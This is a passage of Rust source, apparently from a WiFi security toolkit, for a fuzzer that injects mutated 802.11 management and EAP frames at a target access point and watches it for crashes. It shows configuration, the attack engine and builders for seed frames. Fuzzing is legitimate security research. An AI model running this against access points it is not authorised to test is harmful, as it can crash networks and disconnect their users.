//! WiFi Fuzzer — intelligent mutation-based fuzzer for 802.11 frames.
//!
//! Three fuzzing domains:
//!   1. **Frame** — mutate management frames (beacon, probe, auth, assoc, action, EAP/EAPOL)
//!   2. **IE** — oversized/malformed Information Elements, overflow past declared length
//!   3. **EAP** — corrupt EAP-Identity, challenge/response fields
//!
//! Nine mutation strategies (bitflags):
//!   1. BitFlip — flip random bits
//!   2. ByteFlip — replace random bytes
//!   3. Boundary — set fields to boundary values (0x00, 0xFF, 0x7F, 0x80, etc.)
//!   4. Overflow — extend frame past limits with random data
//!   5. Truncation — truncate to shorter-than-minimum length
//!   6. TypeConfuse — swap frame type/subtype with unexpected values
//!   7. Random — fill payload with random bytes (preserve MAC header)
//!   8. Repeat — duplicate IEs within frame
//!   9. KnownBad — CVE-triggering constructions
//!
//! Crash detection:
//!   - BeaconLoss — no beacon from target for N ms
//!   - ProbeTimeout — probe request not answered
//!   - DeformedResponse — garbled/unexpected response from target
//!   - ClientDrop — associated client disappears
//!
//! Architecture (SharedAdapter):
//!   The attack locks the channel to the target AP's channel. The scanner
//!   pauses hopping but keeps processing frames on the locked channel.
//!   The fuzzer injects mutated frames and periodically health-checks the
//!   target via probe requests, recording crashes with trigger frame metadata.
//!
//! Ported from `wifi-map/libwifikit/attacks/attack_fuzz.c` (1,471 lines).

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use crate::adapter::SharedAdapter;
use crate::core::{EventRing, MacAddress, TxOptions};
use crate::core::frame::TxFlags;
use crate::store::Ap;
use crate::protocol::ieee80211::fc;

// ═══════════════════════════════════════════════════════════════════════════════
//  xoshiro256** RNG — fast, high quality, seedable
// ═══════════════════════════════════════════════════════════════════════════════

/// xoshiro256** pseudorandom number generator.
///
/// Fast, high-quality, seedable PRNG. Uses SplitMix64 to expand a 32-bit seed
/// to 256-bit internal state. Identical to the C implementation for reproducibility.
#[derive(Clone, Debug)]
pub struct Xoshiro256 {
    s: [u64; 4],
}

impl Xoshiro256 {
    /// Create a new RNG seeded from a 32-bit value.
    ///
    /// Uses SplitMix64 to expand the seed to 256-bit internal state.
    /// Same seed always produces the same sequence.
    pub fn new(seed: u32) -> Self {
        let mut s = [0u64; 4];
        // SplitMix64 expansion — identical to C rng_seed()
        let mut z = seed as u64 + 0x9e3779b97f4a7c15u64;
        for slot in &mut s {
            z = z.wrapping_add(0x9e3779b97f4a7c15u64);
            let mut t = z;
            t = (t ^ (t >> 30)).wrapping_mul(0xbf58476d1ce4e5b9u64);
            t = (t ^ (t >> 27)).wrapping_mul(0x94d049bb133111ebu64);
            *slot = t ^ (t >> 31);
        }
        Self { s }
    }

    /// Generate next 64-bit value.
    pub fn next_u64(&mut self) -> u64 {
        let result = (self.s[1].wrapping_mul(5)).rotate_left(7).wrapping_mul(9);
        let t = self.s[1] << 17;
        self.s[2] ^= self.s[0];
        self.s[3] ^= self.s[1];
        self.s[1] ^= self.s[2];
        self.s[0] ^= self.s[3];
        self.s[2] ^= t;
        self.s[3] = self.s[3].rotate_left(45);
        result
    }

    /// Generate a 32-bit value (upper 32 bits of next_u64).
    pub fn next_u32(&mut self) -> u32 {
        (self.next_u64() >> 32) as u32
    }

    /// Generate a value in [0, max). Returns 0 if max == 0.
    pub fn range(&mut self, max: u32) -> u32 {
        if max == 0 { return 0; }
        self.next_u32() % max
    }

    /// Fill a byte slice with random data.
    #[allow(dead_code)]
    pub fn fill_bytes(&mut self, buf: &mut [u8]) {
        for b in buf.iter_mut() {
            *b = self.range(256) as u8;
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Fuzzing Enums — frame types, domains, mutations, detection, phases
// ═══════════════════════════════════════════════════════════════════════════════

/// Frame types that can be fuzzed.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FuzzFrameType {
    /// Beacon management frame.
    Beacon,
    /// Probe Request management frame.
    ProbeReq,
    /// Probe Response management frame.
    ProbeResp,
    /// Authentication management frame.
    Auth,
    /// Association Request management frame.
    AssocReq,
    /// Association Response management frame.
    AssocResp,
    /// Deauthentication management frame.
    Deauth,
    /// Disassociation management frame.
    Disassoc,
    /// Action management frame.
    Action,
    /// EAP/EAPOL data frame.
    Eap,
    /// Cycle through all frame types.
    All,
}

impl FuzzFrameType {
    /// Human-readable label.
    pub fn label(&self) -> &'static str {
        match self {
            Self::Beacon => "Beacon",
            Self::ProbeReq => "Probe Request",
            Self::ProbeResp => "Probe Response",
            Self::Auth => "Authentication",
            Self::AssocReq => "Association Request",
            Self::AssocResp => "Association Response",
            Self::Deauth => "Deauthentication",
            Self::Disassoc => "Disassociation",
            Self::Action => "Action",
            Self::Eap => "EAP/EAPOL",
            Self::All => "All",
        }
    }

    /// Parse from string (CLI input).
    #[allow(dead_code)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "beacon" => Some(Self::Beacon),
            "probe-req" | "probereq" => Some(Self::ProbeReq),
            "probe-resp" | "proberesp" => Some(Self::ProbeResp),
            "auth" => Some(Self::Auth),
            "assoc-req" | "assocreq" => Some(Self::AssocReq),
            "assoc-resp" | "assocresp" => Some(Self::AssocResp),
            "deauth" => Some(Self::Deauth),
            "disassoc" => Some(Self::Disassoc),
            "action" => Some(Self::Action),
            "eap" | "eapol" => Some(Self::Eap),
            "all" => Some(Self::All),
            _ => None,
        }
    }

    /// All concrete (non-All) types, in cycle order.
    pub fn all_concrete() -> &'static [FuzzFrameType] {
        &[
            Self::Beacon, Self::ProbeReq, Self::ProbeResp, Self::Auth,
            Self::AssocReq, Self::AssocResp, Self::Deauth, Self::Disassoc,
            Self::Action, Self::Eap,
        ]
    }
}

/// Fuzzing domains.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FuzzDomain {
    /// Mutate entire management frames.
    Frame,
    /// Oversized/malformed Information Elements.
    Ie,
    /// Corrupt EAP-Identity, challenge/response fields.
    Eap,
    /// Cycle through all domains.
    All,
}

#[allow(dead_code)]
impl FuzzDomain {
    /// Human-readable label.
    pub fn label(&self) -> &'static str {
        match self {
            Self::Frame => "Frame",
            Self::Ie => "IE",
            Self::Eap => "EAP",
            Self::All => "All",
        }
    }

    /// Parse from string (CLI input).
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "frame" => Some(Self::Frame),
            "ie" => Some(Self::Ie),
            "eap" => Some(Self::Eap),
            "all" => Some(Self::All),
            _ => None,
        }
    }

    /// All concrete (non-All) domains, in cycle order.
    pub fn all_concrete() -> &'static [FuzzDomain] {
        &[Self::Frame, Self::Ie, Self::Eap]
    }
}

/// Mutation strategy bitflags. Multiple can be enabled simultaneously.
#[allow(dead_code)]
pub mod mutation {
    /// Flip random bits in the frame.
    pub const BIT_FLIP: u32 = 1 << 0;
    /// Replace random bytes with random values.
    pub const BYTE_FLIP: u32 = 1 << 1;
    /// Set fields to boundary values (0x00, 0xFF, 0x7F, 0x80, etc.).
    pub const BOUNDARY: u32 = 1 << 2;
    /// Extend frame past limits with random data.
    pub const OVERFLOW: u32 = 1 << 3;
    /// Truncate to shorter-than-minimum length.
    pub const TRUNCATION: u32 = 1 << 4;
    /// Swap frame type/subtype with unexpected values.
    pub const TYPE_CONFUSE: u32 = 1 << 5;
    /// Fill payload with random bytes (preserve MAC header).
    pub const RANDOM: u32 = 1 << 6;
    /// Duplicate IEs within frame.
    pub const REPEAT: u32 = 1 << 7;
    /// CVE-triggering constructions (known-bad patterns).
    pub const KNOWN_BAD: u32 = 1 << 8;
    /// All mutation strategies enabled.
    pub const ALL: u32 = BIT_FLIP | BYTE_FLIP | BOUNDARY | OVERFLOW | TRUNCATION
        | TYPE_CONFUSE | RANDOM | REPEAT | KNOWN_BAD;

    /// Number of individual mutation bits.
    pub const COUNT: u32 = 9;

    /// Human-readable label for a single mutation bit.
    pub fn label(bit: u32) -> &'static str {
        match bit {
            BIT_FLIP => "Bit Flip",
            BYTE_FLIP => "Byte Flip",
            BOUNDARY => "Boundary",
            OVERFLOW => "Overflow",
            TRUNCATION => "Truncation",
            TYPE_CONFUSE => "Type Confusion",
            RANDOM => "Random",
            REPEAT => "Repeat",
            KNOWN_BAD => "Known Bad",
            _ => "Unknown",
        }
    }
}

/// Alias for mutation constants module, for CLI import compatibility.
#[allow(unused_imports)]
pub use mutation as FuzzMutation;

/// Crash detection method bitflags.
#[allow(dead_code)]
pub mod detect {
    /// No beacon from target for N ms.
    pub const BEACON_LOSS: u32 = 1 << 0;
    /// Probe request not answered within timeout.
    pub const PROBE_TIMEOUT: u32 = 1 << 1;
    /// Garbled/unexpected response from target.
    pub const DEFORMED_RESPONSE: u32 = 1 << 2;
    /// Associated client disappears.
    pub const CLIENT_DROP: u32 = 1 << 3;
    /// All detection methods enabled.
    pub const ALL: u32 = BEACON_LOSS | PROBE_TIMEOUT | DEFORMED_RESPONSE | CLIENT_DROP;

    /// Human-readable label for a single detection method bit.
    pub fn label(bit: u32) -> &'static str {
        match bit {
            BEACON_LOSS => "Beacon Loss",
            PROBE_TIMEOUT => "Probe Timeout",
            DEFORMED_RESPONSE => "Deformed Response",
            CLIENT_DROP => "Client Drop",
            _ => "Unknown",
        }
    }
}

/// Alias for detect constants module, for CLI import compatibility.
#[allow(unused_imports)]
pub use detect as FuzzDetect;

/// Fuzzer lifecycle phase.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FuzzPhase {
    /// Initial state — not started.
    Idle,
    /// Probing target to establish baseline.
    Probing,
    /// Actively fuzzing the target.
    Fuzzing,
    /// Monitoring after potential crash detected.
    Monitoring,
    /// Crash found, paused for user review.
    CrashFound,
    /// Attack completed or stopped.
    Done,
}

impl Default for FuzzPhase {
    fn default() -> Self {
        Self::Idle
    }
}

#[allow(dead_code)]
impl FuzzPhase {
    /// Human-readable label.
    pub fn label(&self) -> &'static str {
        match self {
            Self::Idle => "Idle",
            Self::Probing => "Probing",
            Self::Fuzzing => "Fuzzing",
            Self::Monitoring => "Monitoring",
            Self::CrashFound => "Crash Found",
            Self::Done => "Done",
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FuzzParams — behavior configuration only (no target fields)
// ═══════════════════════════════════════════════════════════════════════════════

/// Fuzzer attack parameters. Target comes from the scanner's Ap struct.
#[allow(dead_code)]
#[derive(Clone, Debug)]
pub struct FuzzParams {
    /// Which frame type to fuzz. Default: All (cycles through all 10 types).
    pub frame_type: FuzzFrameType,
    /// Fuzzing domain. Default: Frame.
    pub domain: FuzzDomain,
    /// Enabled mutation strategies (bitflags). Default: ALL.
    pub mutations: u32,

    /// Maximum fuzzing iterations (0 = unlimited). Default: 0.
    pub max_iterations: u64,
    /// Number of frames per batch before health check. Default: 10.
    pub batch_size: u32,

    /// Delay between fuzz frames. Default: 1ms.
    pub interval: Duration,
    /// How often to health-check the target. Default: 2s.
    pub probe_interval: Duration,
    /// Timeout waiting for probe response. Default: 1s.
    pub probe_timeout: Duration,
    /// Duration without beacon before declaring crash. Default: 5s.
    pub beacon_loss_threshold: Duration,
    /// How long to wait for target recovery after crash. Default: 10s.
    pub recovery_wait: Duration,

    /// Enabled crash detection methods (bitflags). Default: ALL.
    pub detect_methods: u32,
    /// Pause fuzzing when a crash is detected. Default: true.
    pub pause_on_crash: bool,
    /// Log all injected frames (not just crash triggers). Default: false.
    pub log_all_frames: bool,

    /// Number of bits to flip per BitFlip mutation. Default: 3.
    pub bit_flip_count: u32,
    /// Number of bytes to replace per ByteFlip mutation. Default: 2.
    pub byte_flip_count: u32,
    /// Extra bytes to append for Overflow mutation. Default: 64.
    pub overflow_extra_bytes: u32,

    /// Target IE tag ID for IE domain (0xFF = all). Default: 0xFF.
    pub ie_target_id: u8,
    /// Maximum IE length for generated IEs. Default: 255.
    pub ie_max_len: u8,
    /// Number of times to repeat an IE in Repeat mutation. Default: 32.
    pub ie_repeat_count: u32,

    /// RNG seed (0 = derive from time). Default: 0.
    pub seed: u32,
    /// Wait after channel lock for PLL/AGC stabilization. Default: 50ms.
    pub channel_settle: Duration,
}

impl Default for FuzzParams {
    fn default() -> Self {
        Self {
            frame_type: FuzzFrameType::All,
            domain: FuzzDomain::Frame,
            mutations: mutation::ALL,
            max_iterations: 0,
            batch_size: 10,
            interval: Duration::from_millis(1),
            probe_interval: Duration::from_secs(2),
            probe_timeout: Duration::from_secs(1),
            beacon_loss_threshold: Duration::from_secs(5),
            recovery_wait: Duration::from_secs(10),
            detect_methods: detect::ALL,
            pause_on_crash: true,
            log_all_frames: false,
            bit_flip_count: 3,
            byte_flip_count: 2,
            overflow_extra_bytes: 64,
            ie_target_id: 0xFF,
            ie_max_len: 255,
            ie_repeat_count: 32,
            seed: 0,
            channel_settle: Duration::from_millis(50),
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FuzzInfo — real-time state snapshot
// ═══════════════════════════════════════════════════════════════════════════════

/// Real-time info snapshot for the CLI to render.
#[derive(Debug, Clone)]
pub struct FuzzInfo {
    // === State ===
    /// Current fuzzer phase.
    pub phase: FuzzPhase,
    /// Whether the fuzzer is currently running.
    pub running: bool,

    // === Current iteration ===
    /// Frame type being fuzzed in current iteration.
    pub current_frame_type: FuzzFrameType,
    /// Domain being fuzzed in current iteration.
    pub current_domain: FuzzDomain,
    /// Mutation strategy used in current iteration (single bit).
    pub current_mutation: u32,
    /// Enabled mutation strategies (bitflags from params).
    pub mutations: u32,

    // === Progress ===
    /// Current iteration number.
    pub iteration: u64,
    /// Maximum iterations (0 = unlimited).
    pub max_iterations: u64,

    // === Counters ===
    /// Total frames injected.
    pub frames_sent: u64,
    /// Total frames received (health check responses, etc).
    pub frames_received: u64,
    /// Frames per second rate.
    pub frames_per_sec: f64,
    /// Health check probes sent.
    pub probes_sent: u32,
    /// Health check probes answered.
    pub probes_answered: u32,

    // === Crash stats ===
    /// Total crashes detected.
    pub crashes_found: u32,
    /// Crashes where target recovered.
    pub crashes_recovered: u32,
    /// Crashes where target did not recover.
    pub crashes_permanent: u32,

    // === Timing ===
    /// Time elapsed since attack start.
    pub elapsed: Duration,

    // === RNG ===
    /// Actual seed used (may differ from param if param was 0).
    pub actual_seed: u32,

    // === Target ===
    /// Target AP BSSID.
    pub target_bssid: MacAddress,
    /// Target AP SSID.
    pub target_ssid: String,
    /// Target AP channel.
    pub target_channel: u8,
}

impl Default for FuzzInfo {
    fn default() -> Self {
        Self {
            phase: FuzzPhase::Idle,
            running: false,
            current_frame_type: FuzzFrameType::All,
            current_domain: FuzzDomain::Frame,
            current_mutation: 0,
            mutations: 0,
            iteration: 0,
            max_iterations: 0,
            frames_sent: 0,
            frames_received: 0,
            frames_per_sec: 0.0,
            probes_sent: 0,
            probes_answered: 0,
            crashes_found: 0,
            crashes_recovered: 0,
            crashes_permanent: 0,
            elapsed: Duration::ZERO,
            actual_seed: 0,
            target_bssid: MacAddress::ZERO,
            target_ssid: String::new(),
            target_channel: 0,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FuzzEvent — discrete things that happened
// ═══════════════════════════════════════════════════════════════════════════════

/// Discrete event fired during the fuzz attack.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct FuzzEvent {
    /// Monotonic sequence number.
    pub seq: u64,
    /// Time since attack start.
    pub timestamp: Duration,
    /// What happened.
    pub kind: FuzzEventKind,
}

/// What happened.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub enum FuzzEventKind {
    /// Attack started against target.
    AttackStarted {
        bssid: MacAddress,
        ssid: String,
        channel: u8,
        seed: u32,
        domain: FuzzDomain,
        frame_type: FuzzFrameType,
        mutations: u32,
    },
    /// Baseline probe sent/received.
    BaselineProbe {
        probe_num: u32,
        alive: bool,
    },
    /// Baseline probing complete.
    BaselineComplete {
        probes_ok: u32,
        total: u32,
    },
    /// Fuzzing loop started.
    FuzzingStarted,
    /// Mutation applied to a frame.
    MutationApplied {
        iteration: u64,
        frame_type: FuzzFrameType,
        domain: FuzzDomain,
        mutation: u32,
        frame_len: usize,
    },
    /// Frame injected successfully.
    FrameInjected {
        iteration: u64,
        frame_type: FuzzFrameType,
        mutation: u32,
        frame_len: usize,
    },
    /// Health check started.
    HealthCheckStarted,
    /// Health check result.
    HealthCheckResult {
        alive: bool,
        probes_sent: u32,
        probes_answered: u32,
    },
    /// Crash detected — target stopped responding.
    CrashDetected {
        iteration: u64,
        frame_type: FuzzFrameType,
        mutation: u32,
        domain: FuzzDomain,
        detect_method: u32,
        description: String,
    },
    /// Target recovered after crash.
    CrashRecovery {
        crash_num: u32,
        recovery_ms: u32,
        description: String,
    },
    /// Target did not recover — permanent crash.
    CrashPermanent {
        crash_num: u32,
        description: String,
    },
    /// Fuzzer paused on crash (waiting for resume).
    Paused {
        crash_num: u32,
    },
    /// Fuzzer resumed after pause.
    Resumed,
    /// Periodic rate snapshot.
    RateSnapshot {
        iteration: u64,
        frames_sent: u64,
        frames_per_sec: f64,
        elapsed: Duration,
        crashes_found: u32,
    },
    /// Attack complete.
    AttackComplete {
        iterations: u64,
        frames_sent: u64,
        frames_received: u64,
        crashes_found: u32,
        crashes_recovered: u32,
        crashes_permanent: u32,
        elapsed: Duration,
    },
    /// Channel locked for attack.
    ChannelLocked { channel: u8 },
    /// Channel unlocked — scanner resumes hopping.
    ChannelUnlocked,
    /// Non-fatal error during attack.
    Error { message: String },
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FuzzCrash — crash record with trigger frame metadata
// ═══════════════════════════════════════════════════════════════════════════════

/// Maximum trigger frame bytes stored in a crash record.
pub const MAX_CRASH_FRAME: usize = 512;

/// Record of a detected crash.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct FuzzCrash {
    /// Crash number (1-based).
    pub crash_num: u32,
    /// Iteration when crash was detected.
    pub iteration: u64,
    /// Frame type that triggered the crash.
    pub frame_type: FuzzFrameType,
    /// Mutation strategy that triggered the crash.
    pub mutation: u32,
    /// Domain that was being fuzzed.
    pub domain: FuzzDomain,
    /// Detection method that caught the crash.
    pub detect_method: u32,
    /// Time since attack start when crash was detected.
    pub elapsed: Duration,
    /// Target BSSID.
    pub target_bssid: MacAddress,
    /// Raw bytes of the frame that triggered the crash (up to 512 bytes).
    pub trigger_frame: Vec<u8>,
    /// Human-readable description.
    pub description: String,
    /// Recovery time in milliseconds (None if permanent crash).
    pub recovery_ms: Option<u32>,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Fuzz Result — per-mutation-type outcome
// ═══════════════════════════════════════════════════════════════════════════════

/// Result for a single fuzzing run or mutation type.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub struct FuzzResult {
    /// Mutation type label (e.g., "Bit Flip", "Overflow").
    pub mutation_type: String,
    /// Frames sent using this mutation type.
    pub frames_sent: u64,
    /// Crashes detected using this mutation type.
    pub crashes_detected: u32,
    /// Anomalies detected using this mutation type.
    pub anomalies_detected: u32,
    /// Time spent fuzzing with this mutation type.
    pub elapsed: Duration,
}

/// Final result after fuzz attack completes.
#[allow(dead_code)]
#[derive(Debug, Clone, Default)]
pub struct FuzzFinalResult {
    /// Per-mutation-type results.
    pub results: Vec<FuzzResult>,
    /// Total frames injected.
    pub total_frames: u64,
    /// Total crashes detected.
    pub total_crashes: u32,
    /// Total anomalies detected.
    pub total_anomalies: u32,
    /// Total attack duration.
    pub elapsed: Duration,
}

// ═══════════════════════════════════════════════════════════════════════════════
//  FuzzAttack — the attack engine (SharedAdapter architecture)
// ═══════════════════════════════════════════════════════════════════════════════

/// WiFi fuzzer attack engine.
///
/// Uses SharedAdapter for all adapter access. Spawns its own thread via start().
/// The scanner keeps running alongside — channel contention is managed by the
/// SharedAdapter's channel lock mechanism.
pub struct FuzzAttack {
    params: FuzzParams,
    info: Arc<Mutex<FuzzInfo>>,
    events: Arc<EventRing<FuzzEvent>>,
    running: Arc<AtomicBool>,
    done: Arc<AtomicBool>,
    paused: Arc<AtomicBool>,
    crashes: Arc<Mutex<Vec<FuzzCrash>>>,
}

impl FuzzAttack {
    /// Create a new fuzz attack with the given parameters.
    pub fn new(params: FuzzParams) -> Self {
        Self {
            params,
            info: Arc::new(Mutex::new(FuzzInfo::default())),
            events: Arc::new(EventRing::new(1024)),
            running: Arc::new(AtomicBool::new(false)),
            done: Arc::new(AtomicBool::new(false)),
            paused: Arc::new(AtomicBool::new(false)),
            crashes: Arc::new(Mutex::new(Vec::new())),
        }
    }

    /// Start the fuzz attack on a background thread.
    ///
    /// `target` is the AP from the scanner. The attack locks the channel
    /// to the target's channel, establishes baseline, then fuzzes in a loop.
    pub fn start(&self, shared: SharedAdapter, target: Ap) {
        let info = Arc::clone(&self.info);
        let events = Arc::clone(&self.events);
        let running = Arc::clone(&self.running);
        let done = Arc::clone(&self.done);
        let paused = Arc::clone(&self.paused);
        let crashes = Arc::clone(&self.crashes);
        let params = self.params.clone();

        running.store(true, Ordering::SeqCst);
        done.store(false, Ordering::SeqCst);
        paused.store(false, Ordering::SeqCst);
        {
            let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
            info.running = true;
            info.phase = FuzzPhase::Probing;
            info.target_bssid = target.bssid;
            info.target_ssid = target.ssid.clone();
            info.target_channel = target.channel;
            info.max_iterations = params.max_iterations;
            info.mutations = params.mutations;
        }

        let target_clone = target;

        thread::Builder::new()
            .name("fuzz".into())
            .spawn(move || {
                let reader = shared.subscribe("fuzz");
                run_fuzz_attack(
                    &shared, &reader, &target_clone, &params,
                    &info, &events, &running, &paused, &crashes,
                );
                running.store(false, Ordering::SeqCst);
                done.store(true, Ordering::SeqCst);
                {
                    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
                    info.running = false;
                    info.phase = FuzzPhase::Done;
                }
            })
            .expect("failed to spawn fuzz thread");
    }

    /// Signal the attack to stop. Non-blocking.
    pub fn signal_stop(&self) {
        self.running.store(false, Ordering::SeqCst);
        // Also unpause if paused so thread can exit
        self.paused.store(false, Ordering::SeqCst);
    }

    /// Check if the attack has finished.
    pub fn is_done(&self) -> bool {
        self.done.load(Ordering::SeqCst)
    }

    /// Check if the attack is currently running.
    #[allow(dead_code)]
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }

    /// Check if the fuzzer is paused (on crash).
    #[allow(dead_code)]
    pub fn is_paused(&self) -> bool {
        self.paused.load(Ordering::SeqCst)
    }

    /// Resume fuzzing after a pause-on-crash.
    pub fn resume(&self) {
        self.paused.store(false, Ordering::SeqCst);
    }

    /// Get current info snapshot for rendering.
    pub fn info(&self) -> FuzzInfo {
        self.info.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    /// Drain new events since last call.
    pub fn events(&self) -> Vec<FuzzEvent> {
        self.events.drain()
    }

    /// Get all recorded crashes.
    #[allow(dead_code)]
    pub fn crashes(&self) -> Vec<FuzzCrash> {
        self.crashes.lock().unwrap_or_else(|e| e.into_inner()).clone()
    }

    /// Human-readable name.
    #[allow(dead_code)]
    pub fn name(&self) -> &'static str {
        "fuzz"
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Seed frame builders — create valid base frames for mutation
// ═══════════════════════════════════════════════════════════════════════════════

/// Build a seed beacon frame in the given buffer.
/// Returns the number of bytes written, or 0 if buffer too small.
fn build_seed_beacon(
    buf: &mut [u8],
    bssid: &[u8; 6],
    our_mac: &[u8; 6],
    ssid: &str,
    seq: u16,
) -> usize {
    if buf.len() < 60 { return 0; }
    let mut pos = 0;

    // Frame control: Beacon
    buf[pos] = fc::BEACON; pos += 1;
    buf[pos] = 0x00; pos += 1;
    // Duration
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    // DA: broadcast
    buf[pos..pos + 6].copy_from_slice(&[0xFF; 6]); pos += 6;
    // SA: our MAC
    buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
    // BSSID
    buf[pos..pos + 6].copy_from_slice(bssid); pos += 6;
    // Seq
    buf[pos] = (seq & 0xFF) as u8; pos += 1;
    buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;
    // Fixed params: Timestamp (8), Beacon Interval (2), Cap Info (2)
    buf[pos..pos + 8].fill(0); pos += 8; // timestamp
    buf[pos] = 0x64; pos += 1; // beacon interval 100 TU
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x31; pos += 1; // cap: ESS + Short Preamble + Short Slot
    buf[pos] = 0x04; pos += 1;

    // SSID IE
    let ssid_bytes = ssid.as_bytes();
    let ssid_len = ssid_bytes.len().min(32);
    buf[pos] = 0; pos += 1; // tag: SSID
    buf[pos] = ssid_len as u8; pos += 1;
    if ssid_len > 0 {
        buf[pos..pos + ssid_len].copy_from_slice(&ssid_bytes[..ssid_len]);
        pos += ssid_len;
    }

    // Supported Rates IE
    buf[pos] = 1; pos += 1;
    buf[pos] = 8; pos += 1;
    let rates = [0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24];
    buf[pos..pos + 8].copy_from_slice(&rates); pos += 8;

    // DS Parameter Set IE (channel 1 placeholder)
    buf[pos] = 3; pos += 1;
    buf[pos] = 1; pos += 1;
    buf[pos] = 1; pos += 1;

    pos
}

/// Build a seed probe request frame.
fn build_seed_probe_req(
    buf: &mut [u8],
    our_mac: &[u8; 6],
    ssid: &str,
    seq: u16,
) -> usize {
    if buf.len() < 40 { return 0; }
    let mut pos = 0;

    buf[pos] = fc::PROBE_REQ; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    // DA: broadcast
    buf[pos..pos + 6].copy_from_slice(&[0xFF; 6]); pos += 6;
    // SA
    buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
    // BSSID: broadcast
    buf[pos..pos + 6].copy_from_slice(&[0xFF; 6]); pos += 6;
    // Seq
    buf[pos] = (seq & 0xFF) as u8; pos += 1;
    buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;

    // SSID IE
    let ssid_bytes = ssid.as_bytes();
    let ssid_len = ssid_bytes.len().min(32);
    buf[pos] = 0; pos += 1;
    buf[pos] = ssid_len as u8; pos += 1;
    if ssid_len > 0 {
        buf[pos..pos + ssid_len].copy_from_slice(&ssid_bytes[..ssid_len]);
        pos += ssid_len;
    }

    // Supported Rates
    buf[pos] = 1; pos += 1;
    buf[pos] = 8; pos += 1;
    let rates = [0x02, 0x04, 0x0B, 0x16, 0x0C, 0x12, 0x18, 0x24];
    buf[pos..pos + 8].copy_from_slice(&rates); pos += 8;

    pos
}

/// Build a seed probe response frame.
fn build_seed_probe_resp(
    buf: &mut [u8],
    target: &[u8; 6],
    bssid: &[u8; 6],
    ssid: &str,
    seq: u16,
) -> usize {
    if buf.len() < 60 { return 0; }
    let mut pos = 0;

    buf[pos] = fc::PROBE_RESP; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    // DA
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    // SA
    buf[pos..pos + 6].copy_from_slice(bssid); pos += 6;
    // BSSID
    buf[pos..pos + 6].copy_from_slice(bssid); pos += 6;
    // Seq
    buf[pos] = (seq & 0xFF) as u8; pos += 1;
    buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;

    // Fixed: timestamp (8) + beacon interval (2) + cap info (2)
    buf[pos..pos + 8].fill(0); pos += 8;
    buf[pos] = 0x64; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x31; pos += 1;
    buf[pos] = 0x04; pos += 1;

    // SSID
    let ssid_bytes = ssid.as_bytes();
    let ssid_len = ssid_bytes.len().min(32);
    buf[pos] = 0; pos += 1;
    buf[pos] = ssid_len as u8; pos += 1;
    if ssid_len > 0 {
        buf[pos..pos + ssid_len].copy_from_slice(&ssid_bytes[..ssid_len]);
        pos += ssid_len;
    }

    // Supported Rates
    buf[pos] = 1; pos += 1;
    buf[pos] = 8; pos += 1;
    let rates = [0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24];
    buf[pos..pos + 8].copy_from_slice(&rates); pos += 8;

    // DS Parameter Set
    buf[pos] = 3; pos += 1;
    buf[pos] = 1; pos += 1;
    buf[pos] = 1; pos += 1;

    pos
}

/// Build a seed authentication frame.
fn build_seed_auth(
    buf: &mut [u8],
    target: &[u8; 6],
    our_mac: &[u8; 6],
    seq: u16,
) -> usize {
    if buf.len() < 30 { return 0; }
    let mut pos = 0;

    buf[pos] = fc::AUTH; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
    // DA
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    // SA
    buf[pos..pos + 6].copy_from_slice(our_mac); pos += 6;
    // BSSID
    buf[pos..pos + 6].copy_from_slice(target); pos += 6;
    // Seq
    buf[pos] = (seq & 0xFF) as u8; pos += 1;
    buf[pos] = ((seq >> 8) & 0xFF) as u8; pos += 1;

    // Auth algo (Open System), seq 1, status success
    buf[pos] = 0x00; pos += 1; // algo low
    buf[pos] = 0x00; pos += 1; // algo high
    buf[pos] = 0x01; pos += 1; // seq low
    buf[pos] = 0x00; pos += 1; // seq high
    buf[pos] = 0x00; pos += 1; // status low
    buf[pos] = 0x00; pos += 1; // status high

    pos
}

/// Build a seed association request frame.
fn build_seed_assoc_req(
    buf: &mut [u8],
    target: &[u8; 6],
    our_mac: &[u8; 6],
    ssid: &str,
    seq: u16,
) -> usize {
    if buf.len() < 50 { return 0; }
    let mut pos = 0;

    buf[pos] = fc::ASSOC_REQ; pos += 1;
    buf[pos] = 0x00; pos += 1;
    buf[pos] = 0x00; pos += 1;
